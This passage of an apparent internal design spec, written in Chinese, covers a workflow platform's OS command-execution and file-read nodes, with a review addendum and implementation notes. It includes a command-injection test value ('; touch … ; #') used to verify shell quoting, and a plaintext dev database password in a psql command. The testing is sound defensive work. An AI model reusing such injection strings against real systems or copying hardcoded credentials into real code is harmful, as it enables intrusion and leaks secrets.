  `/opt/tmp/verify/20260830-end-cancel-mode.log`
- 變數插值的引號化要做 **mutation 驗證**：暫時拿掉 `shlex.quote()`，
  確認注入測資真的會執行；恢復後確認不會
- 原始輸出落地 `/opt/tmp/verify/<日期>-osnode.log`（VERIFY-01）
- 前端面板由主 Claude 用 chrome-devtools 實際點過

---

## 十二、已確認不做 / v2 候選

- **不支援 `at`**：實測不可管理，理由見第七節末尾
- **不需要 `sudo kill`**：`systemctl stop` 靠 cgroup 就收掉含 root 在內的全部子孫（已實測）
- **流程模板的修改者與版本編號不必新增**：`fw_workflow_templates` 與
  `fw_form_templates` 都已有 `created_by_*` / `updated_by_*` / `version` / `revision`，
  PUT 時會寫入，設計器也已顯示（`wf-render.js:116-138`）。
  缺的只有**歷史快照**（哪個 revision 是誰改的），Ethan 2026-08-30 決定不做
- `result_edges`：不做，理由見第五節
- v2 候選：`match_scope: field_n`、CSV 結構化查詢、regex 的硬性 timeout、
  OsExecutor 例外記錄的管理頁

---

## 十三、實作決策補遺（2026-08-30 冷讀審核後補）

規格交給一個不帶脈絡的讀者（codex，read-only）冷讀後，補上會造成**設計分歧或錯誤實作**
的九項。其餘缺口（icon、display_name、面板欄位排列、cron 腳本細節）照既有節點的
慣例做即可，不列。

### 1. dispatched 與 End cancel 的語意矛盾（冷讀抓到的實質漏洞）

dispatched 節點啟動 unit 後立刻回 `SUCCESS`，而 `cancel_pending_nodes` 只掃
`status='RUNNING' AND process_id IS NOT NULL` —— **它永遠找不到已 dispatched 的 unit**。
第七節「cancel 收得到」的敘述在這個路徑上不成立。

處置：新增 config **`cancel_scope`**：

| 值 | 行為 |
|---|---|
| `unit`（預設） | 流程被 cancel 時連同 unit 一起 `systemctl stop`。cancel 要**額外**掃該樹上 `node_type='OsExecutor'` 且 `result->'os_dispatch'->>'unit'` 非空的節點（**不論 status**），對仍 active 的 unit 執行 stop |
| `detach` | 流程取消也不停 unit。適合「這件事一旦送出就該做完」的作業 |

`detach` 要在設計器面板上明確標示「流程取消後仍會繼續執行」。

### 2. 授權拒絕的結果語意

`OS_NODE_ENABLED` 未開、企業不在白名單、`base_dir` 驗證失敗——
一律 `status: 'success'` ＋ `_result='exception'` ＋ `_error_kind='not_authorized'`，
**不是** `error`。理由同第三節：回 `error` 會被重試 3 次，而授權拒絕重試永遠不會成功。

### 3. OsFileRead 的 base_dir 設定來源

**三者疊加，取交集**：系統設定 `os_file_read_base_dirs`（全平台上限）
∩ 企業設定（該企業可讀的子集）∩ 節點 config 的 `base_dir`（本次要讀哪一個）。
**系統設定預設為空 ＝ 全部拒絕**（fail-closed）。
`/opt/tmp/osnode/` 不自動加入——要讓 OsFileRead 讀得到 OsExecutor 的輸出，
部署時明確加進系統設定。

### 4. `max_scan_ms` 對 Python `re` 無效（冷讀抓到的第二個實質問題）

wall-clock 檢查只在**行與行之間**執行；單次 `re.search()` 在一行內卡住時，
那個檢查根本輪不到。所以 v1 的保護是**限制單次 re 的輸入規模**：

- 逐行比對，**單行長度上限 64KB**（超過的行截斷後再比對並標 `_line_truncated`）
- 樣式長度上限 **200 字元**
- `max_scan_ms` 在行間檢查，負責整體上限

這讓 ReDoS 的最壞情況有界。要真正的 timeout 得換 `regex` 套件（v2）。

### 5. `extra_env` 的格式與禁區

`{名稱: 值}` dict；名稱須合 `^[A-Za-z_][A-Za-z0-9_]{0,127}$`；值走變數插值但**不經
`shlex.quote()`**（它不進命令字串，是 execve 的參數，沒有 shell 解析問題）。

**禁止覆蓋**：`BP_EXEC` / `BP_ORG` / `BP_WF`（追蹤標記，覆蓋等於湮滅稽核線索）、
`PATH` / `HOME` / `LANG`（白名單基底）。命中禁區一律拒絕整次執行，不是忽略。

### 6. executor uid 的取得

`os.getuid()`，**不從 config 讀**（同「CLI 路徑不從節點 config 取」那條的理由：
graph 可被 PUT 改寫）。sudoers 的 `--uid=*` 萬用字元因此只會收到 executor 自己的 uid。

### 7. unit 名稱

`bp-<queue_secure_code>`。`secure_code` 是 `secrets.token_urlsafe(16)` 產出的 22 字元
（字元集 `[A-Za-z0-9_-]`），**全部落在 systemd unit 名稱的合法字元內**，
總長 25 字元遠低於上限，不需要轉換。實作時仍要有 assert，
避免日後 secure_code 產生方式改變而靜默壞掉。

### 8. `notify_to` 的格式與 fallback

`user_secure_code` 的陣列。預設值取流程模板的 `updated_by_secure_code`（單值陣列）。
**取不到、帳號已停用或已刪除時不發、只記 WARNING log** ——
不要退回「發給企業所有管理員」，那會在無人維護的舊流程上變成定期騷擾。

### 9. 驗收用的環境資料

CLAUDE.md 的「開發測試登入」段有 quick-login 的完整 curl 寫法與現成 user_id；
本節點另外需要：

```bash
# 有 form_workflow 合約的企業與其 ORG_ADMIN
PGPASSWORD=postgres123 psql -h localhost -U beakplatform -d beakplatform_dev -t -A -F'|' -c "
SELECT o.secure_code, o.code, u.secure_code, u.email
FROM organizations o JOIN users u ON u.org_secure_code = o.secure_code
WHERE u.user_type='ORG_ADMIN' AND u.is_deleted=false AND o.is_deleted=false ORDER BY o.id;"

# 含 DecisionWriter 的既有流程（beluga，可直接加節點測試）
# http://192.168.0.16:7000/beakplatform/forms/workflows/7LJRvpSPUYcmK1M1wcOTzY

# 重啟 executor（改 handler 後必做，但先確認沒有流程在跑，見 CLAUDE.md 該段）
sudo systemctl restart beakplatform-dev-executor
```

安全的測試命令：`/bin/echo`、`/bin/true`、`/bin/false`（測 exit code 分類）、
`/bin/sleep`（測逾時與 cancel）。**不要用會改變系統狀態的命令做驗收。**

### 10. `WorkflowLogService` 的修正是獨立待辦

**本任務不必修**，前置單是 PF-183。未修之前 OsExecutor 的 log 一樣寫得進去
（只是 `node_type` 欄位是 `'SYSTEM'`），用 `node_id` 仍查得到單一節點的紀錄。
兩張單的先後不強制，但 PF-181 驗收「從 log 找線索」那項要等 PF-183 完成才算數。


---

## 十四、實作後記（2026-08-30，實作與驗收後補）

實際落地的檔案：

| 檔案 | 內容 |
|---|---|
| `modules/form_workflow/services/node_handlers/os_executor_handler.py` | OsExecutor handler |
| `modules/form_workflow/services/node_handlers/os_file_read_handler.py` | OsFileRead handler |
| `modules/form_workflow/services/workflow_engine.py` | `_stop_os_dispatched_units()`，cancel 時停 unit |
| `modules/form_workflow/services/workflow_executor.py` | **WAITING 喚醒清單加 `OsExecutor`**（見下方差異 2） |
| `scripts/migrations/120_seed_os_executor_node.sql` / `121_seed_file_read_node.sql` | 節點定義與 system_settings，`is_active=FALSE` 出廠 |
| `scripts/cron/os_node_cleanup.py` | 輸出檔清理 + `systemctl reset-failed 'bp-*'` |
| `wf-node-os-executor.js` / `wf-node-os-file-read.js` | 設計器面板 |
| `docs/install/os_node.md` | 部署與授權說明（會推 GitHub） |

### 與本規格的六處差異

1. **輸出進 log 的上限採 2KB。** 第七節「輸出處理（三層上限）」寫 2KB、
   第九節的表格寫「log_data 存前 8KB」，兩處互相矛盾。實作取較保守的 2KB
   （`OUTPUT_LOG_LIMIT`）。全文一律在落檔裡，log 只留摘要與路徑。

2. **第十節「不必改引擎」是錯的。** 併發上限回 `status: 'waiting'` 之後，
   `workflow_executor.py` 有**兩處** WAITING 撿取清單
   （`node_type.in_(['Delay','End','ParallelJoin'])`），OsExecutor 不在裡面，
   被擋下的節點就**永遠停在 WAITING**。實測第 4 個節點的 `scheduled_at` 過期數分鐘
   仍未被喚醒。已把 `'OsExecutor'` 加進那兩處。
   **日後任何會回 `waiting` / `pending` 的新節點都要同步加。**

3. **dispatched 的「事後查得到結果」只對失敗的 unit 成立。** 第七節說不加
   `--collect` 就查得到，實測 `Result=exit-code / ExecMainStatus=3` 確實查得到；
   但**成功結束的 transient unit 會被 systemd 自動回收**，`systemctl show` 之後
   `LoadState=not-found`（回的 `Result=success` 是預設值不是真實結果）。
   成功與否要看 `journalctl -u bp-<sc>`。這件事已寫進 `docs/install/os_node.md`。

4. **OsFileRead 的「企業層 base_dir」定案存在系統設定 `os_file_read_org_base_dirs`**
   （json 物件，key 是 org secure_code）。第十三節第 3 點只說「企業設定」沒指定位置；
   實作沒有為它新增資料表或欄位。**該企業沒有鍵時視為「不再收窄」，直接用平台清單。**

5. **併發上限的參數是 `OS_NODE_MAX_CONCURRENT_PER_ORG`（預設 3）**，
   排隊重試間隔 15 秒。第十節只寫「超過上限」沒有給參數名與預設值。

6. **`shlex.quote()` 的 mutation 驗證改用 `!raw` 對照組**，沒有真的去改程式碼。
   同一筆注入測資 `; touch <檔案> ; #`：走 `${v.x}` 時展開成
   `/bin/echo '; touch ... ; #'` 且檔案不存在；走 `${v.x!raw}` 時展開成
   `/bin/echo ; touch ... ; #` 且檔案真的被建立。
   這比暫時改程式碼更嚴謹：測的是同一支程式的兩個分支，可重複、不留殘骸。

### 實作時另外修掉的兩個 OsFileRead 缺陷

- `occurrence='first'` 與 `max_windows` 達標時 `break` 之前沒清掉 `current`，
  迴圈後的收尾又 append 一次 → **同一個窗口輸出兩次並多一條 `--`**
- `tail` 的 `_truncated` 用 `position > 0` 判定 → 任何大檔的 tail 恆為 true，
  旗標失去鑑別力。改為「撞到 `MAX_READ_BYTES` 才算截斷」

### 尚未做（v2 候選，不是缺陷）

- 白名單與允許目錄**沒有 Web UI**，一律走 SQL 或 migration（登記一筆等同授權，
  屬部署期決定，與 SqlExecutor 白名單的處理方式一致）
- `docs/manual/` 沒有對應的使用者手冊頁（目前只有 `docs/install/os_node.md`
  這份給維運人員的文件）
- OsExecutor 例外／逾時記錄的管理頁（第十二節已列為 v2）

### 2026-08-31 授權機制通用化

- 企業授權來源已從 `system_settings.os_node_allowed_orgs` /
  `system_settings.file_read_allowed_orgs` 改為 `workflow_node_org_grants` 表，
  受限節點由 `workflow_node_definitions.org_restricted` 標示。
- 三個消費點都改吃同一個 service：設計器節點可見性、graph 寫入驗證、handler 執行期。
- `.env` 的 `OS_NODE_ENABLED` / `OS_FILE_READ_NODE_ENABLED` 仍是主機層總開關，
  與企業授權維持 AND 關係。
- 舊的兩個 system_settings 白名單鍵已在 migration 122 轉入 grants 後刪除；
  `os_file_read_base_dirs` 與 `os_file_read_org_base_dirs` 維持不變。
